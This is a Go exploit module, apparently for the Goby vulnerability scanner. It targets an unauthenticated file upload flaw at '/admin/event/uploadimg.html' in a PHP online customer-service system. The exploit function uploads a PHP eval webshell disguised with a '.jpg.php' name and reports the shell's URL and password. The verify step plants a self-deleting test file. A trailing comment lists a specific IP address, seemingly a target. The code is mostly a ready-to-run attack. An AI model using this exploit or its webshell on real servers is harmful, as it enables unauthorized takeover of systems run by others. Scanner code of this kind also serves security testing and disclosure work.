package exploits

import (
	"bytes"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"io"
	"math/rand"
	"mime/multipart"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "PHP Customer Service System uploadimg.html File Upload",
    "Description": "PHP online customer service system supports web and mobile H5 webpage customer service. It only needs to embed a JS segment to quickly access the customer service system. Due to improper code filtering, it leads to unauthorized arbitrary file upload vulnerability",
    "Product": "php-chat-live",
    "Homepage": "https://gobies.org/",
    "DisclosureDate": "2021-06-06",
    "Author": "sharecast.net@gmail.com",
    "GobyQuery": "body=\"/platform/passport/resetpassword.html\"",
    "Level": "3",
    "Impact": "<p>As a result, hackers can upload malicious files to the server to obtain the server permissions.</p>",
    "Recommendation": "<p>1. The execution permission is disabled in the storage directory of the uploaded file.</p><p>2. File suffix white list.</p><p>3. Upgrade to the latest version.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/-LnDOjoqYMjtjoVV9l-EuA"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "<?php @eval($_POST[1]); if($_GET['act']=='del'){unlink(__FILE__);}?>"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND"
    ],
    "ExploitSteps": null,
    "Tags": [
        "File Upload"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10223"
}`
	postinfo := func(filebuf *bytes.Buffer, params map[string]string, fieldname string, filename string) (*bytes.Buffer, string) {
		bodyBuf := &bytes.Buffer{}
		bodyWriter := multipart.NewWriter(bodyBuf)

		fileWriter, err := bodyWriter.CreateFormFile(fieldname, filename)
		if err != nil {
			fmt.Println("error writing to buffer")
		}

		_, err = io.Copy(fileWriter, filebuf)

		if params != nil {
			for key, val := range params {
				_ = bodyWriter.WriteField(key, val)
			}
		}

		if err != nil {
			fmt.Println("copy file error")
		}

		contentType := bodyWriter.FormDataContentType()
		bodyWriter.Close()

		return bodyBuf, contentType
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/admin/event/uploadimg.html"
			r1 := rand.Intn(7999999) + 150000
			if resp, err := httpclient.SimpleGet(u.FixedHostInfo + uri); err == nil {
				if resp.StatusCode == 500 && strings.Contains(resp.Utf8Html, "editormd-image-file") {
					shell := `<?php echo md5(233);unlink(__FILE__);?>`
					payload := bytes.NewBufferString(shell)
					fieldname := "editormd-image-file"
					filename := fmt.Sprintf("%d.jpg.php", r1)
					pinfo, ctype := postinfo(payload, nil, fieldname, filename)
					cfg := httpclient.NewPostRequestConfig(uri)
					cfg.Header.Store("Content-Type", ctype)
					cfg.VerifyTls = false
					cfg.FollowRedirect = true
					cfg.Data = pinfo.String()
					if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
						if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, ".php") {
							regexp := regexp.MustCompile(`"url"\s?:\s?"(.*?)"`)
							url := regexp.FindAllStringSubmatch(resp.Utf8Html, -1)[0][1]
							shell_url := strings.Replace(url, `\`, ``, -1)
							if resp, err := httpclient.SimpleGet(u.FixedHostInfo + shell_url); err == nil {
								return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "e165421110ba03099a1c0393373c5b43")
							}
						}

					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			r1 := rand.Intn(7999999) + 150000
			uri := "/admin/event/uploadimg.html"
			shell := ss.Params["cmd"].(string)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 500 && strings.Contains(resp.Utf8Html, "editormd-image-file") {
					payload := bytes.NewBufferString(shell)
					fieldname := "editormd-image-file"
					filename := fmt.Sprintf("%d.jpg.php", r1)
					pinfo, ctype := postinfo(payload, nil, fieldname, filename)
					cfg := httpclient.NewPostRequestConfig(uri)
					cfg.Header.Store("Content-Type", ctype)
					cfg.VerifyTls = false
					cfg.FollowRedirect = true
					cfg.Data = pinfo.String()
					if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
						if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, ".php") {
							regexp := regexp.MustCompile(`"url"\s?:\s?"(.*?)"`)
							url := regexp.FindAllStringSubmatch(resp.Utf8Html, -1)[0][1]
							shell_url := fmt.Sprintf(`%s%s`, expResult.HostInfo.FixedHostInfo, strings.Replace(url, `\`, ``, -1))
							if resp, err := httpclient.SimpleGet(shell_url); err == nil {
								if resp.StatusCode == 200 {
									expResult.Success = true
									shellinfo := fmt.Sprintf("url: %s, pass:1", shell_url)
									expResult.Output = shellinfo
								}

							}
						}

					}

				}
			}
			return expResult
		},
	))
}

//http://121.43.163.27/
